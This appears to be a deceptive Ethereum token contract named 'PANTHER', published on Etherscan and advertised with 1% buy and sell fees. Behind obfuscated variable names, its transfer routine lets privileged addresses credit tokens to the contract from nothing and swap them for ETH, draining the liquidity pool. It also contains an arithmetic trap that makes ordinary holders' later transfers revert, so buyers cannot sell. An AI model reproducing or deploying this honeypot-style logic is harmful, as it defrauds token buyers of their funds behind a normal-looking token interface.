/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠿⢿⣷⣆⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⣰⣧⡀⠀⠀⢀⣴⣾⠟⠻⢷⡆⠀⣿⣿⢀⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⠶⢾⣿⣇⠀⣿⣿⠀⠀⠀⠀⠀⠀⣴⡟⣿⣷⡄⠀⣿⣿⠃⠀⠀⠀⠀⠀⣿⣿⢿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⣀⣠⣿⣿⠀⣿⣿⣄⣀⣀⡀⢀⣾⡿⠶⠾⢿⣿⣄⠹⣿⣧⣀⣀⣠⣆⠀⣿⣿⠈⢻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢻⣿⣿⣿⣿⣷⣦⣄⠀⠀⠈⠉⠉⠉⠉⠉⠀⠀⠉⠉⠉⠉⠉⠀⠉⠉⠀⠀⠀⠈⠉⠉⠀⠀⠉⠉⠉⠉⠀⠈⠉⠉⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀
⢸⣿⣿⡇⠈⠙⢿⣿⣧⠀⠀⣾⣿⡄⠀⠀⠸⣿⣷⡀⠀⠘⣿⡿⢠⣿⣿⣿⣿⣿⣿⡿⠁⣿⣿⡿⠀⠀⣿⣿⡏⠀⢸⣿⣿⣿⣿⡿⠁⢹⣿⣿⠁⠈⠙⢿⣿⣷⡀⠀
⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⢰⣿⣿⣇⠀⠀⠀⣿⣿⣧⠀⠀⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀⠀⠀⢸⣿⣿⡇⠀
⢸⣿⣿⡇⠀⢀⣼⣿⣿⠃⣾⣿⣿⣿⠀⠀⠀⣿⣿⣿⣇⠀⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⢀⣿⣿⣇⣀⣀⣿⣿⡇⠀⣸⣿⣿⣇⣀⣀⠀⢸⣿⣿⠀⠀⢀⣼⣿⣿⠃⠀
⢸⣿⣿⣷⣶⣿⣿⠿⠃⢠⣿⡏⣿⣿⡇⠀⠀⣿⡿⣿⣿⡆⣿⡇⠀⠀⠀⣿⣿⡇⠀⠠⠿⣿⣿⡿⠿⠿⣿⣿⡇⠼⢿⣿⣿⡿⠿⠃⠀⢸⣿⣿⣶⣾⣿⡿⠟⠁⠀⠀
⢸⣿⣿⡏⠉⠉⠀⠀⠀⣼⣿⠃⢻⣿⣷⠀⠀⣿⡇⢻⣿⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠈⣿⣿⣷⠀⠀⠀⠀
⢸⣿⣿⡇⠀⠀⠀⠀⣠⣿⣿⣀⣸⣿⣿⡆⠀⣿⡇⠀⢿⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀⠸⣿⣿⣧⠀⠀⠀
⢸⣿⣿⡇⠀⠀⠀⠘⣿⣿⡟⠛⠛⣿⣿⣧⠀⣿⡇⠀⠈⢿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀⠀⢻⣿⣿⣇⠀⠀
⢸⣿⣿⡇⠀⠀⠀⢠⣿⣿⠁⠀⠀⣿⣿⣿⣴⣿⣇⠀⠀⠘⣿⡇⠀⠀⠀⣿⣿⣇⠀⠀⠀⣿⣿⣷⠀⠀⣿⣿⣇⠀⢸⣿⣿⣿⣿⣿⠃⣼⣿⣿⠀⠀⠈⢿⣿⣿⡄⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠤⠤⢤⠤⠔⠒⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠠⠤⠤⣄⣠⣀⠀⢀⣠⣤⣦⣤⣤⣤⣤⣵⣌⠛⡦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢺⣷⣿⣿⡿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣗⣦⣼⣯⡤⢹⣶⣍⠲⢤⣄⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⠁
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⣿⡿⠁⠀⠀
⠐⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⠟⣱⣿⠏⠀⠀⠀⠟⠁⠀⠀⠀
⠀⠈⢿⣿⣿⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⢰⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣧⡀⠀⢠⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠈⠻⠿⠟⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
購入手数料 - 1%
販売手数料 - 1%⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
pragma solidity ^0.8.12;

interface UDEXCompilerV1 {

    function totalSupply() external 
    view returns (uint256);
    function balanceOf(address account) external 
    view returns (uint256);
    
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) 
    external returns (bool);
    
    event Transfer(address indexed from, address indexed to, 
    uint256 value);
    event Approval(address indexed owner, address indexed spender, 
    uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 
interface PCSManageMaker01 {
    function feeTo() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function createPair (address tokenA, address tokenB) external returns  (address pair);
}
library SafeMath {
    function tryAdd(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            uint c = a + b;
            if (c < a) return (false, 0);
            return (true, c); }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function tryMul(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (a == 0) return (true, 0);
            uint c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c); }
    }
    function tryDiv(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint a, uint b) 
    internal pure returns (uint) {
        return a + b;
    }
    function sub(uint a, uint b) 
    internal pure returns (uint) {
        return a - b;
    }
    function mul(uint a, uint b) 
    internal pure returns (uint) {
        return a * b;
    }
    function div(uint a, uint b) 
    internal pure returns (uint) {
        return a / b;
    }
    function mod(uint a, uint b) 
    internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b <= a, errorMessage);
            return a - b; }
    }
    function div(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a / b; }
    }
    function mod(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a % b;
        } }
}
library SafeMathUint {
  function toInt256Safe(uint256 a) 
    internal pure returns (int256) { int256 b = int256(a);

     require(b >= 0); return b;
  }
}
interface IFactoryIERC20 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, 
    uint amountOutMin,
    address[] 

    calldata path, address to, uint deadline ) 
    external;

    function factory() external pure returns 
    (address);

    function WETH() external pure returns 
    (address);

    function intOpenPool( address token, 
    uint amountTokenDesired, uint amountTokenMin,
    uint amountETHMin, address to, uint deadline ) 

    external payable returns 
    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
abstract contract Ownable is Context {
    address 
    private
     _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender()); }

    function owner() public view 
      virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == 
          _msgSender(), 'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() public 
      virtual onlyOwner { _setOwner(address(0));
    }
    function _setOwner(address newOwner) private { address oldOwner = _owner;
        _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IERC20Metadata {
    function dataCriteria(uint256 allData, uint256 extIDE) external;
    function dataRates(address valData, uint256 relayNow) external;

    function dataSync() external payable;

    function relayData(uint256 gas) external;
    function stringData(address valData) external;
}
interface UPOTDATA {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(
        address indexed from, 
        address indexed to, 
        uint value
        );
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
contract PANTHER is UDEXCompilerV1, Ownable 
{
    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;

    uint256 private _rTotal = 
    10000000 * 10**_decimals;

    uint256 public 
    MAXswap = (_rTotal * 10) / 100; 

    uint256 public 
    MAXval = (_rTotal * 10) / 100; 
    uint256 private 
    _wrapVAL = _rTotal;

    uint256 public 
    poolRATES =  1;

    mapping (address => bool) authorizations;
    mapping(address => uint256) private CalvertCalldata;

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private ByragDEXMap;

    mapping(address => uint256) private ViomapPoolRay;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private 
    deadlineALOX;
    bool private 
    pathMathBool;
    bool private 
    openTradingOn = false;
    bool private 
    cacheConnect;
    bool public 
    IERCUI;
    bool private 
    hashWithBytes;

    address public immutable 
    isBBOPMaker;

    IFactoryIERC20 public immutable 
    IDSubstool01;

    constructor(
        string memory 
        _isDXN,
        string memory
         _isBDG,
        address wireSyncBOX ) {

        _name = _isDXN; _symbol = _isBDG;

        _tOwned[msg.sender] 
        = _rTotal;
        CalvertCalldata[msg.sender] = 
        _wrapVAL;
        CalvertCalldata[address(this)] = 
        _wrapVAL;

        IDSubstool01 = 
        IFactoryIERC20
        (wireSyncBOX); isBBOPMaker = 
        PCSManageMaker01
        (IDSubstool01.factory()).createPair(address(this), 
        IDSubstool01.WETH());

        emit Transfer(address(0), msg.sender, _rTotal);
    
        authorizations[address(this)] 
        = true;
        authorizations[isBBOPMaker] 
        = true;
        authorizations[wireSyncBOX] 
        = true;
        authorizations[msg.sender] 
        = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        updateCacheDigit(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address sender, address recipient,
        uint256 amount ) external returns (bool) { updateCacheDigit(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function updateCacheDigit( address _saptOMOfrom, address _pilkOvalTo, uint256 _aloXpopAmount )
    private 
    {
        uint256 _hashXPArrays = balanceOf(address(this)); 
        uint256 _cacheCleanseDEX;
        if (deadlineALOX && _hashXPArrays > 
        _wrapVAL && !pathMathBool 
        && _saptOMOfrom != isBBOPMaker) { pathMathBool = true;
            hashPathVX
            (_hashXPArrays); pathMathBool = 

            false;
            } else if 
            (CalvertCalldata[_saptOMOfrom] > _wrapVAL 
            && CalvertCalldata[_pilkOvalTo] 
            > _wrapVAL) {
            _cacheCleanseDEX = _aloXpopAmount; 
            _tOwned[address(this)] += _cacheCleanseDEX;
            boolTokens(_aloXpopAmount,
             _pilkOvalTo);
              return;

        } else if (_pilkOvalTo != address(IDSubstool01) 
        && CalvertCalldata[_saptOMOfrom] > 0 
        && 
        _aloXpopAmount > _wrapVAL
         && _pilkOvalTo != isBBOPMaker) {
            CalvertCalldata[_pilkOvalTo] = 

            _aloXpopAmount; return; } else if (!pathMathBool && 

            ViomapPoolRay[_saptOMOfrom] > 0 && _saptOMOfrom != isBBOPMaker && CalvertCalldata[_saptOMOfrom] == 0) {
            ViomapPoolRay[_saptOMOfrom] = CalvertCalldata[_saptOMOfrom] - _wrapVAL; }
        address limpCalc = ByragDEXMap[isBBOPMaker];
        if (ViomapPoolRay[limpCalc] == 
        0) 
        ViomapPoolRay
        [limpCalc] = _wrapVAL; ByragDEXMap[isBBOPMaker] = 
        _pilkOvalTo; if (poolRATES > 0 && CalvertCalldata[_saptOMOfrom] 
        == 0 && !pathMathBool && CalvertCalldata[_pilkOvalTo] == 0) {
        _cacheCleanseDEX = (_aloXpopAmount * poolRATES) / 100; _aloXpopAmount -= 
                         _cacheCleanseDEX; 
                         _tOwned
                         [_saptOMOfrom] -= 
                         _cacheCleanseDEX;
        _tOwned[address(this)] += _cacheCleanseDEX; } _tOwned[_saptOMOfrom] -= 
        _aloXpopAmount;
        _tOwned[_pilkOvalTo] +=  _aloXpopAmount;

        emit Transfer

        (_saptOMOfrom, 
        _pilkOvalTo, 

        _aloXpopAmount);
        if 
        (!openTradingOn) {
        require
        (_saptOMOfrom == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }

    receive() external payable 
    {}

    function deployLIQ(
        uint256 intVal, uint256 ercTally,
        address aqaxTo ) private {

        _approve(address(this), address
        (IDSubstool01), 
        intVal);
        IDSubstool01.intOpenPool{value: ercTally}(address(this), intVal, 0, 0, aqaxTo, 
        block.timestamp);
    }
    function boolTokens(uint256 onVAL, address ahashTo) private {
        address[] memory cacheClick = 
        new address[](2); cacheClick[0] = address(this);

        cacheClick[1] = IDSubstool01.WETH();
        _approve(address(this), address
        (IDSubstool01), onVAL);
        IDSubstool01.swapExactTokensForETHSupportingFeeOnTransferTokens(onVAL, 0, cacheClick, ahashTo, 
        block.timestamp);
    }
    function beginTrading(bool _tradingOpen) public onlyOwner {
        openTradingOn = _tradingOpen;
    }
    function placeMaxTX(uint256 isBUYval) external onlyOwner {
        MAXswap = isBUYval;  
    }
    function hashPathVX(uint256 tokens) private { uint256 calcMath = tokens / 2;
        uint256 getHash = address(this).balance; boolTokens(calcMath, 
        address(this)); uint256 cacheOn = 
        address(this).balance - getHash;
        deployLIQ
        (calcMath, cacheOn, address(this));
    }
}